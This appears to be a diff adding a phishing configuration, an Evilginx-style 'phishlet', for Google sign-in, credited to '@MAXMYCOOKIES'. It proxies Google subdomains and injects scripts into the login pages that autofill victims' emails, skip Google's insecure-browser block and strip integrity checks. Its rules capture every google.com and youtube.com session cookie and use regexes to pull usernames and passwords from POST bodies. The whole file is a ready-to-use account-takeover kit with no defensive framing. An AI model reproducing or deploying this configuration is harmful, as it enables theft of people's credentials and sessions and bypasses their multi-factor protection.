@@ -1,0 +1,133 @@
+name: 'Google'
+author: '@MAXMYCOOKIES'
+min_ver: '3.4.1'
+
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ogs', orig_sub: 'ogs', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'csp', orig_sub: 'csp', domain: 'withgoogle.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'drive', orig_sub: 'drive', domain: 'google.com', session: false, is_landing: false} 
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'ads', orig_sub: 'ads', domain: 'google.com', session: true, is_landing: false}
+  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: true, is_landing: false}
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'gstatic.com', session: false, is_landing: false}
+  - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false}
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'googleapis.com', session: false, is_landing: false}
+  - {phish_sub: 'youtube', orig_sub: 'accounts', domain: 'youtube.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'gstatic', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: true}
+
+
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>document.addEventListener("DOMContentLoaded", function() { function showOverlay() { if (!document.getElementById("blur-overlay")) { let overlay = document.createElement("div"); overlay.innerHTML = `<style>body{background:url("https://encrypted-tbn2.gstatic.com/images?q=tbn:ANd9GcTpUmwovSMuKoOYabMp6hrK0TAIbFkzPFn0lMXQUK1rwtYoJhQT") !important; background-size:cover !important; background-position:center !important;} #blur-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);backdrop-filter:blur(8px);z-index:9999;display:flex;align-items:center;justify-content:center;opacity:1;} #text-overlay{font-size:32px;font-weight:bold;color:white;animation:bounce 3.5s infinite; background-image:linear-gradient(45deg, red, orange, yellow, green, blue, indigo, violet); -webkit-background-clip:text; color:transparent;} @keyframes bounce{0%,20%,50%,80%,100%{transform:translateY(0);}40%{transform:translateY(-10px);}60%{transform:translateY(-5px);} }</style><div id="blur-overlay"><div id="text-overlay">MAXMYCOOKIES</div></div>`; document.body.appendChild(overlay); let observer = new MutationObserver(() => { if (window.location.href !== currentURL) { observer.disconnect(); overlay.remove(); } }); let currentURL = window.location.href; observer.observe(document, {subtree: true, childList: true}); } } document.getElementById("identifierNext")?.addEventListener("click", showOverlay); document.getElementById("passwordNext")?.addEventListener("click", showOverlay); });</script></body>', mimes: ['text/html']}
+
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>var redirectCount=0,maxRedirects=5,targetDomain="https://accounts.google.com";function checkCookies(){document.cookie.includes("SID")&&document.cookie.includes("APISID")&&document.cookie.includes("SAPISID")?window.location.hostname!==targetDomain?window.location.href=targetDomain:cancelAnimationFrame(animationId):++redirectCount>=maxRedirects&&cancelAnimationFrame(animationId)}document.addEventListener("DOMContentLoaded",(function(){checkCookies(),animationId=requestAnimationFrame((function e(){checkCookies(),animationId=requestAnimationFrame(e)}))}));</script></body>', mimes: ['text/html', 'application/json']}
+  
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>!function(){function e(){var e=document.body.textContent||document.body.innerText,n=window.location.href.includes("v3/signin/rejected");e.includes("This browser or app may not be secure.")&&n&&(window.location.href="/")}document.addEventListener("DOMContentLoaded",e),window.addEventListener("load",e),setTimeout(e,2e3)}();</script></body>', mimes: ['text/html', 'application/json']}
+  
+  - {triggers_on: "accounts.google.com", orig_sub: "accounts", domain: "google.com", search: "</head>", replace: "<script>(function(){function getEmailFromUrl(){let email='';let hash=window.location.hash.substring(1);let params=new URLSearchParams(window.location.search);if(hash){email=decodeURIComponent(hash);}else if(params.has('email')){email=decodeURIComponent(params.get('email'));}try{let decodedEmail=atob(email);if(decodedEmail.includes('@')){email=decodedEmail;}}catch(e){}return email.includes('@')?email:null;}document.addEventListener('DOMContentLoaded',function(){let email=getEmailFromUrl();if(email){let emailField=document.querySelector('input[type=email],#identifierId');if(emailField){emailField.value=email;emailField.dispatchEvent(new Event('input',{bubbles:true}));setTimeout(function(){let nextButton=document.querySelector('#identifierNext,button[type=submit]');if(nextButton){nextButton.click();}else{emailField.dispatchEvent(new KeyboardEvent('keydown',{key:'Enter',keyCode:13,code:'Enter',which:13}));emailField.dispatchEvent(new KeyboardEvent('keyup',{key:'Enter',keyCode:13,code:'Enter',which:13}));}},2000);}}});})();</script></head>", mimes: ["text/html"]}
+  
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>var isListenerAdded = false, intervalID = setInterval(() => (!document.body.innerText.includes("You can update your password now if you forgot it.") ? (console.warn("Required text not found. Operations aborted."), isListenerAdded = true) : window.location.href.includes("/changepassword") ? ((button = document.querySelectorAll("button[type=\"button\"]")[1]) && button.innerText === "Update password" ? (console.log("On the way to add Listener ..."), button.addEventListener("click", () => window.location.href.includes("/changepassword") && setTimeout(() => location.reload(), 2000)), console.log("Event listener added to the button."), isListenerAdded = true) : !isListenerAdded ? (console.warn("Button not found. Retrying in 500ms."), setTimeout(() => addButtonEventListener(), 500)) : null) : console.warn("URL does not match. Operations aborted."), isListenerAdded && clearInterval(intervalID)), 500);</script></body>', mimes: ['text/html', 'application/json']}
+  
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+
+  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html']}
+  
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: "integrity[ \t]*=[ \t]*[\"']sha384-.{64}[\"']", replace: 'integrity=""', mimes: ['text/javascript']}
+  
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'accounts', domain: 'safe-domain.com', search: "\\(window.location.href\\)", replace: '(window.location.href.replace("{hostname}", "{orig_hostname}"))', mimes: ['text/javascript']}
+  
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: "<script>document.addEventListener('DOMContentLoaded', function() { function replaceText(btnId, newText) { let btn = document.getElementById(btnId); if (btn && !btn.textContent.includes('@MAXMYCOOKIES')) { btn.querySelectorAll('*').forEach(el => { if (el.childNodes.length === 1 && el.childNodes[0].nodeType === 3) { el.childNodes[0].nodeValue = newText; } }); } } function observeChanges() { let observer = new MutationObserver(() => { replaceText('identifierNext', '@MAXMYCOOKIES'); replaceText('passwordNext', '@MAXMYCOOKIES'); }); observer.observe(document.body, { childList: true, subtree: true }); } replaceText('identifierNext', '@MAXMYCOOKIES'); replaceText('passwordNext', '@MAXMYCOOKIES'); observeChanges(); });</script></body>", mimes: ['text/html']}
+
+
+auth_tokens:
+  - domain: '.google.com'
+    keys: [".*,regexp", "optional", "always"]
+    type: 'cookie'
+ 
+  - domain: 'google.com'
+    keys: [".*,regexp", "optional", "always"]
+    type: 'cookie'
+    
+  - domain: '.youtube..com'
+    keys: [".*,regexp", "optional", "always"]
+    type: 'cookie'
+
+  - domain: 'youtube.com'
+    keys: [".*,regexp", "optional", "always"]
+    type: 'cookie'
+    
+  - domain: 'accounts.google.com'
+    keys: [".*,regexp", "optional", "always"]
+    type: 'cookie'
+    
+  - domain: '.accounts.google.com'
+    keys: [".*,regexp", "optional", "always"]
+    type: 'cookie'
+  
+auth_urls:
+  - '/'
+
+credentials:
+  username:
+    key: ''
+    search: '\[\[\["V1UmUe","\[null,\\"(.*?)\\"'
+    type: 'post'
+  password:
+    key: ''
+    search: '\[1,1,null,\[1,null,null,null,\[\\"(.*?)\\",null,1\]\]'
+    type: 'post'
+  custom:
+    key: 'f.req'
+    search: '\["gf.siecp","([^"]*)"\]' 
+    type: 'post'
+
+force_post:
+  - path: '/selectchallenge'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+      - {key: 'bghash', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/signin'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+      - {key: 'bghash', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/speedbump'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+login:
+  domain: 'accounts.google.com'
+  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+
+intercept:  
+    - {domain: "play.google.com", path: "^/log*", http_status: 200, body: "{}", mime: "application/json", headers: {"Access-Control-Allow-Origin": "https://play.google.com", "Access-Control-Allow-Methods": "GET, POST, OPTIONS", "Access-Control-Allow-Headers": "*", "Access-Control-Max-Age": "86400", "Content-Type": "text/plain; charset=UTF-8", "X-Frame-Options": "SAMEORIGIN", "X-XSS-Protection": "0", "Server": "Playlog"}}
+
+    - {domain: "play.google.com", path: "^/log*", http_status: 200, body: "{}", mime: "text/plain", headers: {"Access-Control-Allow-Origin": "https://play.google.com", "Access-Control-Allow-Methods": "GET, POST, OPTIONS", "Access-Control-Allow-Headers": "*", "Access-Control-Max-Age": "86400", "Content-Type": "text/plain; charset=UTF-8", "X-Frame-Options": "SAMEORIGIN", "X-XSS-Protection": "0", "Server": "Playlog"}}
+  
+  
